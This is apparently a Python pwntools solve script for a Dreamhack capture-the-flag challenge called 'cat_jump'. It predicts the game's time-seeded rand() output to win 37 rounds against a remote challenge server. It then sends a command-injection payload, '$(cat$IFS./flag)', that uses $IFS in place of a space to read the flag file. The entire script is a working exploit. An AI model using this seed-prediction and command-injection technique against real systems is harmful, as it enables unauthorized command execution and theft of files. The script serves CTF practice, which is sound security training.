from pwn import *
from ctypes import CDLL
from ctypes.util import find_library

#p = process('./cat_jump')
p = remote('host3.dreamhack.games', 18324)

libc = CDLL(find_library('c'))
libc.srand(libc.time(0))

for i in range(37):
    o = libc.rand() % 2
    if o == 0:
        p.sendlineafter("jump='j': ", "l")
    else:
        p.sendlineafter("jump='j': ", "h")
    print(p.recvline())
    libc.rand()

p.sendlineafter('\xf0\x9f\x98\xbc: ', "$(cat$IFS./flag)")
p.interactive()
